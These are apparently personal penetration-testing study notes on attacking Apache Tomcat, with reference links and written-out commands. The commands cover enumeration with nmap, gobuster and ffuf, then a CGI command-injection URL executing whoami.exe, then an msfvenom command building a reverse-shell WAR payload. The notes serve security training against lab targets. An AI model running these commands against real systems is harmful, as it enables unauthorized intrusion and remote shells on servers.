> Tomcat pen test: [Apache Tomcat Pentesting | Exploit Notes](https://exploit-notes.hdks.org/exploit/web/apache-tomcat-pentesting/)
 >CTF Walkthrough: https://0xdf.gitlab.io/2021/12/29/htb-logforge.html
   Blackhat talk: [Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)

# Enumeration
```
nmap -p- -sC -Pn 10.129.204.227 --open 
```
```
gobuster dir -u http://web01."$domain":8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```
# Footprinting
```
/invalid
```
```
curl -s http://app-dev."$doman":8080/docs/ | grep Tomcat
```

#### Finding CGI script
```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat

#FUZZ.cmd
#FUZZ.ps1
#Combine script path and below vulnerability to exploit this vulnerability.
```
#### Run commands
```
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```
#### Generate Apache tomcat war file
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<local-ip> LPORT=80 -f war -o shell.war
```
#### [[CPTS Notes/03 Exploitation/Application Exploitation/Tomcat|Attack Tomcat]]
